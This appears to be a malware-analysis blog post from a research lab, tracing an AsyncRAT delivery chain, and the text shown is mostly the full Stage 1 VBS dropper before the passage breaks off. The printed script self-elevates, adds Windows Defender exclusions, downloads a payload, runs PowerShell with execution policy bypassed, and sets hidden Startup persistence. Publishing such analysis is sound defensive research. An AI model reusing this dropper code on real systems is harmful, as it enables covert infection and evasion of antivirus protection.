<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Triage Malware Delivery Chain | OALABS Research</title>
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="Triage Malware Delivery Chain" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Walking the delivery chain from VBS to PS to DOTNET" />
<meta property="og:description" content="Walking the delivery chain from VBS to PS to DOTNET" />
<link rel="canonical" href="https://research.openanalysis.net/delivery/triage/powershell/vbs/dotnet/2023/07/02/multichain-delivery.html" />
<meta property="og:url" content="https://research.openanalysis.net/delivery/triage/powershell/vbs/dotnet/2023/07/02/multichain-delivery.html" />
<meta property="og:site_name" content="OALABS Research" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-07-02T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Triage Malware Delivery Chain" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-02T00:00:00-05:00","datePublished":"2023-07-02T00:00:00-05:00","description":"Walking the delivery chain from VBS to PS to DOTNET","headline":"Triage Malware Delivery Chain","mainEntityOfPage":{"@type":"WebPage","@id":"https://research.openanalysis.net/delivery/triage/powershell/vbs/dotnet/2023/07/02/multichain-delivery.html"},"url":"https://research.openanalysis.net/delivery/triage/powershell/vbs/dotnet/2023/07/02/multichain-delivery.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://research.openanalysis.net/feed.xml" title="OALABS Research" /><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />

<script>
function wrap_img(fn) {
    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
        var elements = document.querySelectorAll(".post img");
        Array.prototype.forEach.call(elements, function(el, i) {
            if (el.getAttribute("title") && (el.className != "emoji")) {
                const caption = document.createElement('figcaption');
                var node = document.createTextNode(el.getAttribute("title"));
                caption.appendChild(node);
                const wrapper = document.createElement('figure');
                wrapper.className = 'image';
                el.parentNode.insertBefore(wrapper, el);
                el.parentNode.removeChild(el);
                wrapper.appendChild(el);
                wrapper.appendChild(caption);
            }
        });
    } else { document.addEventListener('DOMContentLoaded', fn); }
}
window.onload = wrap_img;
</script>

<script>
    document.addEventListener("DOMContentLoaded", function(){
    // add link icon to anchor tags
    var elem = document.querySelectorAll(".anchor-link")
    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
    });
</script>
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">OALABS Research</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/categories/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Triage Malware Delivery Chain</h1><p class="page-description">Walking the delivery chain from VBS to PS to DOTNET</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2023-07-02T00:00:00-05:00" itemprop="datePublished">
        Jul 2, 2023
      </time>
       • <span class="read-time" title="Estimated read time">
    
    
      6 min read
    
</span></p>

    
      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
      
        <a class="category-tags-link" href="/categories/#delivery">delivery</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#triage">triage</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#powershell">powershell</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#vbs">vbs</a>
        &nbsp;
      
        <a class="category-tags-link" href="/categories/#dotnet">dotnet</a>
        
      
      </p>
    

    
      
        <div class="pb-5 d-flex flex-justify-left">
            <div class="px-2">
                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
                </a>
            </div>
            <div class="px-2">
                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
                </a>
            </div>
            <div class="px-2">
                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
                </a>
            </div>
          <div class="px-2">

    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2023-07-02-multichain-delivery.ipynb" role="button" target="_blank">
<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
    </a>
</div>

          
          
          
        </div>
      </header>

  <div class="post-content e-content" itemprop="articleBody">
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#Overview">Overview </a></li>
<li class="toc-entry toc-h2"><a href="#Samples">Samples </a></li>
<li class="toc-entry toc-h2"><a href="#Analysis">Analysis </a>
<ul>
<li class="toc-entry toc-h3"><a href="#Stage-1---VBS-Script">Stage 1 - VBS Script </a></li>
<li class="toc-entry toc-h3"><a href="#Stage-2---PS-Script">Stage 2 - PS Script </a></li>
<li class="toc-entry toc-h3"><a href="#Stage-3">Stage 3 </a>
<ul>
<li class="toc-entry toc-h4"><a href="#PS-Script-1---Kill-Windows-Defender">PS Script 1 - Kill Windows Defender </a></li>
<li class="toc-entry toc-h4"><a href="#PS-Script-2---Bypass-AMSI">PS Script 2 - Bypass AMSI </a>
<ul>
<li class="toc-entry toc-h5"><a href="#AMSI-Bypass">AMSI Bypass </a></li>
</ul>
</li>
<li class="toc-entry toc-h4"><a href="#.NET-Injector">.NET Injector </a></li>
</ul>
</li>
</ul>
</li>
</ul><!--
#################################################
### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
#################################################
# file to edit: _notebooks/2023-07-02-multichain-delivery.ipynb
-->

<div class="container" id="notebook-container">
        
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Overview">
<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
</h2>
<p>We are going to analyze a multi-stage delivery chain that ends up delivering <a href="https://www.unpac.me/results/843ac4a3-f058-4a1a-9eda-ead3f0c2d741#/">AsyncRAT</a>. This delivery chain has multiple stages that are responsible for preparing the target host for the delivery of the malware such that the host will likely not detect the final payload.</p>
<p>The sample comes from <a href="https://twitter.com/James_inthe_box">@james_inthe_box</a></p>
<blockquote>
<p><a href="https://twitter.com/James_inthe_box/status/1674105216575373312?s=20">https://twitter.com/James_inthe_box/status/1674105216575373312?s=20</a></p>
</blockquote>
<h2 id="Samples">
<a class="anchor" href="#Samples" aria-hidden="true"><span class="octicon octicon-link"></span></a>Samples<a class="anchor-link" href="#Samples"> </a>
</h2>
<ul>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=8661bf09583ac5882e4183052c4273c267711236b79aeecf3e3fd1ac0da6376e">8661bf09583ac5882e4183052c4273c267711236b79aeecf3e3fd1ac0da6376e</a></li>
</ul>

</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Analysis">
<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
</h2>
<h3 id="Stage-1---VBS-Script">
<a class="anchor" href="#Stage-1---VBS-Script" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 1 - VBS Script<a class="anchor-link" href="#Stage-1---VBS-Script"> </a>
</h3>
<div class="highlight"><pre><span></span><span class="c1">'Hi, This is a good day for me and you , GoodBye ♥</span><span class="w"></span>

<span class="k">on</span><span class="w"> </span><span class="k">error</span><span class="w"> </span><span class="k">resume</span><span class="w"> </span><span class="k">next</span><span class="w"></span>
<span class="kd">Function</span><span class="w"> </span><span class="nf">YEKOQ</span><span class="p">(</span><span class="n">HIZHA</span><span class="p">,</span><span class="n">Path</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">Req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"Msxml2.XMLHttp.6.0"</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">Req</span><span class="p">.</span><span class="n">Open</span><span class="w"> </span><span class="s2">"GET"</span><span class="p">,</span><span class="w"> </span><span class="n">HIZHA</span><span class="p">,</span><span class="w"> </span><span class="no">False</span><span class="w"></span>
<span class="w">    </span><span class="n">Req</span><span class="p">.</span><span class="n">send</span><span class="w"></span>
<span class="w">    </span><span class="n">CKDPR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Replace</span><span class="p">(</span><span class="n">Req</span><span class="p">.</span><span class="n">responseText</span><span class="p">,</span><span class="w"> </span><span class="s2">"BinaryChange"</span><span class="p">,</span><span class="w"> </span><span class="n">GJQBQ</span><span class="p">())</span><span class="w"></span>
<span class="w">    </span><span class="k">If</span><span class="w"> </span><span class="n">Req</span><span class="p">.</span><span class="n">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="k">Then</span><span class="w"></span>
<span class="w">        </span><span class="n">HSHOG</span><span class="w"> </span><span class="n">Path</span><span class="p">,</span><span class="n">CKDPR</span><span class="w"></span>
<span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">If</span><span class="w"></span>
<span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>


<span class="kd">function</span><span class="w"> </span><span class="nf">GJQBQ</span><span class="p">()</span><span class="w"></span>
<span class="w">    </span><span class="n">GJQBQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Replace</span><span class="p">(</span><span class="s2">"removed_pe_file"</span><span class="p">,</span><span class="s2">"imHope"</span><span class="p">,</span><span class="s2">"00"</span><span class="p">)</span><span class="w"></span>
<span class="k">end</span><span class="w"> </span><span class="k">function</span><span class="w"></span>


<span class="kd">Sub</span><span class="w"> </span><span class="nf">SCLBY</span><span class="p">(</span><span class="n">MQTSY</span><span class="p">)</span><span class="w"></span>
<span class="w">   </span><span class="kd">Dim</span><span class="w"> </span><span class="nv">TZPXW</span><span class="w"></span>
<span class="w">   </span><span class="k">Set</span><span class="w"> </span><span class="n">TZPXW</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="p">)</span><span class="w"></span>
<span class="w">   </span><span class="n">TZPXW</span><span class="p">.</span><span class="n">DeleteFile</span><span class="p">(</span><span class="n">MQTSY</span><span class="p">)</span><span class="w"></span>
<span class="k">End</span><span class="w"> </span><span class="k">Sub</span><span class="w"></span>



<span class="kd">Sub</span><span class="w"> </span><span class="nf">HSHOG</span><span class="p">(</span><span class="k">ByVal</span><span class="w"> </span><span class="n">MRADA</span><span class="p">,</span><span class="w"> </span><span class="k">ByVal</span><span class="w"> </span><span class="n">CCGCV</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">On</span><span class="w"> </span><span class="k">Error</span><span class="w"> </span><span class="k">Resume</span><span class="w"> </span><span class="k">Next</span><span class="w"></span>
<span class="w">    </span><span class="kd">Dim</span><span class="w"> </span><span class="nv">XRJWL</span><span class="p">,</span><span class="w"> </span><span class="nv">UKUZG</span><span class="w"></span>
<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">XRJWL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">If</span><span class="w"> </span><span class="n">XRJWL</span><span class="p">.</span><span class="n">FileExists</span><span class="p">(</span><span class="n">MRADA</span><span class="p">)</span><span class="w"> </span><span class="k">Then</span><span class="w"></span>
<span class="w">        </span><span class="k">Set</span><span class="w"> </span><span class="n">UKUZG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XRJWL</span><span class="p">.</span><span class="n">OpenTextFile</span><span class="p">(</span><span class="n">MRADA</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="no">True</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">Else</span><span class="w"></span>
<span class="w">        </span><span class="k">Set</span><span class="w"> </span><span class="n">UKUZG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XRJWL</span><span class="p">.</span><span class="n">CreateTextFile</span><span class="p">(</span><span class="n">MRADA</span><span class="p">,</span><span class="w"> </span><span class="no">True</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">If</span><span class="w"></span>
<span class="w">    </span><span class="k">If</span><span class="w"> </span><span class="nb">Err</span><span class="w"> </span><span class="o">&lt;&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">Then</span><span class="w"></span>
<span class="w">        </span><span class="nb">Err</span><span class="p">.</span><span class="n">Clear</span><span class="w"></span>
<span class="w">        </span><span class="k">On</span><span class="w"> </span><span class="k">Error</span><span class="w"> </span><span class="k">Goto</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="w">        </span><span class="k">Exit</span><span class="w"> </span><span class="kd">Sub</span><span class="w"></span>
<span class="w">    </span><span class="nf">End</span><span class="w"> </span><span class="k">If</span><span class="w"></span>
<span class="w">    </span><span class="n">UKUZG</span><span class="p">.</span><span class="n">WriteLine</span><span class="w"> </span><span class="n">CCGCV</span><span class="w"></span>
<span class="w">    </span><span class="n">UKUZG</span><span class="p">.</span><span class="n">Close</span><span class="w"></span>
<span class="w">    </span><span class="nb">Err</span><span class="p">.</span><span class="n">Clear</span><span class="w"></span>
<span class="w">    </span><span class="k">On</span><span class="w"> </span><span class="k">Error</span><span class="w"> </span><span class="k">Goto</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="k">End</span><span class="w"> </span><span class="k">Sub</span><span class="w"></span>



<span class="kd">Function</span><span class="w"> </span><span class="nf">CCFRA</span><span class="p">(</span><span class="n">DOJVJ</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">HSHOG</span><span class="w"> </span><span class="n">DOJVJ</span><span class="p">,</span><span class="s2">"PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command %cd%\BJUEL.ps1"</span><span class="w"> </span>
<span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>



<span class="kd">Function</span><span class="w"> </span><span class="nf">YSLLW</span><span class="p">(</span><span class="n">FPMNG</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">HSHOG</span><span class="w"> </span><span class="n">FPMNG</span><span class="p">,</span><span class="s2">"on error resume next"</span><span class="w"> </span>
<span class="w">    </span><span class="n">HSHOG</span><span class="w"> </span><span class="n">FPMNG</span><span class="p">,</span><span class="s2">"Set TLZDH = WScript.CreateObject(""WScript.Shell"")"</span><span class="w"> </span>
<span class="w">    </span><span class="n">HSHOG</span><span class="w"> </span><span class="n">FPMNG</span><span class="p">,</span><span class="s2">"APPDATA = TLZDH.ExpandEnvironmentStrings(""%appdata%\WindowsServices"")"</span><span class="w"> </span>
<span class="w">    </span><span class="n">HSHOG</span><span class="w"> </span><span class="n">FPMNG</span><span class="p">,</span><span class="s2">"WScript.Sleep(3000)"</span><span class="w"> </span>
<span class="w">    </span><span class="n">HSHOG</span><span class="w"> </span><span class="n">FPMNG</span><span class="p">,</span><span class="s2">" Set JXQIF = CreateObject(""Shell.Application"")"</span><span class="w"> </span>
<span class="w">    </span><span class="n">HSHOG</span><span class="w"> </span><span class="n">FPMNG</span><span class="p">,</span><span class="s2">"JXQIF.ShellExecute APPDATA &amp; ""\DOJVJ.cmd"", """", APPDATA, """", 0"</span><span class="w"> </span>
<span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>



<span class="kd">Function</span><span class="w"> </span><span class="nf">IBJWI</span><span class="p">(</span><span class="n">YDIAV</span><span class="p">)</span><span class="w"></span>
<span class="w">   </span><span class="kd">Dim</span><span class="w"> </span><span class="nv">LXUUK</span><span class="p">,</span><span class="w"> </span><span class="nv">FPJYO</span><span class="w"></span>
<span class="w">   </span><span class="k">Set</span><span class="w"> </span><span class="n">LXUUK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="p">)</span><span class="w"></span>
<span class="w">   </span><span class="k">Set</span><span class="w"> </span><span class="n">FPJYO</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LXUUK</span><span class="p">.</span><span class="n">CreateFolder</span><span class="p">(</span><span class="n">YDIAV</span><span class="p">)</span><span class="w"></span>
<span class="w">   </span><span class="n">IBJWI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FPJYO</span><span class="p">.</span><span class="n">Path</span><span class="w"></span>
<span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>



<span class="kd">Function</span><span class="w"> </span><span class="nf">TAWBD</span><span class="p">(</span><span class="n">AFOVN</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="kd">Dim</span><span class="w"> </span><span class="nv">LXUUK</span><span class="p">,</span><span class="w"> </span><span class="nv">EZIMG</span><span class="w"></span>
<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">LXUUK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">set</span><span class="w"> </span><span class="n">EZIMG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LXUUK</span><span class="p">.</span><span class="n">GetFile</span><span class="p">(</span><span class="n">AFOVN</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">EZIMG</span><span class="p">.</span><span class="n">attributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EZIMG</span><span class="p">.</span><span class="n">attributes</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="w"></span>
<span class="w">    </span><span class="n">EZIMG</span><span class="p">.</span><span class="n">attributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EZIMG</span><span class="p">.</span><span class="n">attributes</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="w"></span>
<span class="k">end</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>



<span class="kd">Function</span><span class="w"> </span><span class="nf">YRVPO</span><span class="p">(</span><span class="n">AFOVN</span><span class="p">,</span><span class="n">HOCKL</span><span class="p">)</span><span class="w"></span>
<span class="w">     </span><span class="k">Set</span><span class="w"> </span><span class="n">JXQIF</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"Shell.Application"</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">JXQIF</span><span class="p">.</span><span class="n">ShellExecute</span><span class="w"> </span><span class="n">AFOVN</span><span class="p">,</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">HOCKL</span><span class="p">,</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="k">end</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>



<span class="kd">function</span><span class="w"> </span><span class="nf">AGJZU</span><span class="p">(</span><span class="n">AFOVN</span><span class="p">,</span><span class="n">FPMNG</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">MMCVF</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WScript</span><span class="p">.</span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"WScript.Shell"</span><span class="p">)</span><span class="w"> </span>
<span class="w">    </span><span class="n">DTHQX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MMCVF</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="n">AFOVN</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">oLink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MMCVF</span><span class="p">.</span><span class="n">CreateShortcut</span><span class="p">(</span><span class="n">DTHQX</span><span class="p">)</span><span class="w"> </span>
<span class="w">    </span><span class="n">oLink</span><span class="p">.</span><span class="n">TargetPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MMCVF</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="n">FPMNG</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">oLink</span><span class="p">.</span><span class="n">Save</span><span class="w"></span>
<span class="k">end</span><span class="w"> </span><span class="k">function</span><span class="w"></span>



<span class="kd">function</span><span class="w"> </span><span class="nf">XCKPZ</span><span class="p">()</span><span class="w"></span>
<span class="w">    </span><span class="k">On</span><span class="w"> </span><span class="k">Error</span><span class="w"> </span><span class="k">Resume</span><span class="w"> </span><span class="k">Next</span><span class="w"></span>
<span class="w">    </span><span class="k">If</span><span class="w"> </span><span class="ow">Not</span><span class="w"> </span><span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">.</span><span class="n">Named</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="s2">"elevate"</span><span class="p">)</span><span class="w"> </span><span class="k">Then</span><span class="w"></span>
<span class="w">      </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"Shell.Application"</span><span class="p">).</span><span class="n">ShellExecute</span><span class="w"> </span><span class="n">WScript</span><span class="p">.</span><span class="n">FullName</span><span class="p">,</span><span class="w"> </span><span class="s2">""""</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">WScript</span><span class="p">.</span><span class="n">ScriptFullName</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">""" /elevate"</span><span class="p">,</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="s2">"runas"</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
<span class="w">      </span><span class="n">WScript</span><span class="p">.</span><span class="n">Quit</span><span class="w"></span>
<span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">If</span><span class="w"></span>
<span class="w">    </span><span class="k">On</span><span class="w"> </span><span class="k">Error</span><span class="w"> </span><span class="k">Resume</span><span class="w"> </span><span class="k">Next</span><span class="w"></span>
<span class="w">    </span><span class="n">WScript</span><span class="p">.</span><span class="n">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="k">With</span><span class="w"> </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"WScript.Shell"</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">Run</span><span class="w"> </span><span class="s2">"powershell -Command Add-MpPreference -ExclusionPath '%Appdata%'"</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="no">True</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">Run</span><span class="w"> </span><span class="s2">"powershell -Command Add-MpPreference -ExclusionExtension '.vbs'"</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="no">True</span><span class="w"></span>
<span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">With</span><span class="w"></span>
<span class="w">    </span><span class="n">WScript</span><span class="p">.</span><span class="n">Sleep</span><span class="w"> </span><span class="mi">100</span><span class="w"></span>
<span class="k">end</span><span class="w"> </span><span class="k">function</span><span class="w"></span>

<span class="kd">function</span><span class="w"> </span><span class="nf">ALBME</span><span class="p">()</span><span class="w"></span>
<span class="w"> </span><span class="k">Set</span><span class="w"> </span><span class="n">oFso</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">oFso</span><span class="p">.</span><span class="n">DeleteFile</span><span class="w"> </span><span class="n">Wscript</span><span class="p">.</span><span class="n">ScriptFullName</span><span class="p">,</span><span class="w"> </span><span class="no">True</span><span class="w"> </span>
<span class="k">end</span><span class="w"> </span><span class="k">function</span><span class="w"></span>

<span class="n">XCKPZ</span><span class="p">()</span><span class="w"></span>
<span class="c1">'ALBME()</span><span class="w"></span>

<span class="kd">Dim</span><span class="w"> </span><span class="nv">TLZDH</span><span class="w"></span>
<span class="k">Set</span><span class="w"> </span><span class="n">TLZDH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WScript</span><span class="p">.</span><span class="nb">CreateObject</span><span class="p">(</span><span class="s2">"WScript.Shell"</span><span class="p">)</span><span class="w"></span>
<span class="n">APPDATA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TLZDH</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s2">"%appdata%\WindowsServices"</span><span class="p">)</span><span class="w"></span>
<span class="n">STARTUP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TLZDH</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s2">"%USERPROFILE%\Start Menu\Programs\Startup"</span><span class="p">)</span><span class="w"></span>
<span class="n">strCurDir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TLZDH</span><span class="p">.</span><span class="n">CurrentDirectory</span><span class="w"></span>

<span class="n">IBJWI</span><span class="p">(</span><span class="n">APPDATA</span><span class="p">)</span><span class="w"></span>

<span class="n">SCLBY</span><span class="p">(</span><span class="n">APPDATA</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\DOJVJ.cmd"</span><span class="p">)</span><span class="w"></span>
<span class="n">CCFRA</span><span class="p">(</span><span class="n">APPDATA</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\DOJVJ.cmd"</span><span class="p">)</span><span class="w"></span>
<span class="n">TAWBD</span><span class="p">(</span><span class="n">APPDATA</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\DOJVJ.cmd"</span><span class="p">)</span><span class="w"></span>

<span class="n">SCLBY</span><span class="p">(</span><span class="n">STARTUP</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\FPMNG.vbs"</span><span class="p">)</span><span class="w"></span>
<span class="n">YSLLW</span><span class="p">(</span><span class="n">STARTUP</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\FPMNG.vbs"</span><span class="p">)</span><span class="w"></span>
<span class="n">TAWBD</span><span class="p">(</span><span class="n">STARTUP</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\FPMNG.vbs"</span><span class="p">)</span><span class="w"></span>

<span class="n">SCLBY</span><span class="p">(</span><span class="n">STARTUP</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\WindowsServices-MMCVF.lnk"</span><span class="p">)</span><span class="w"></span>
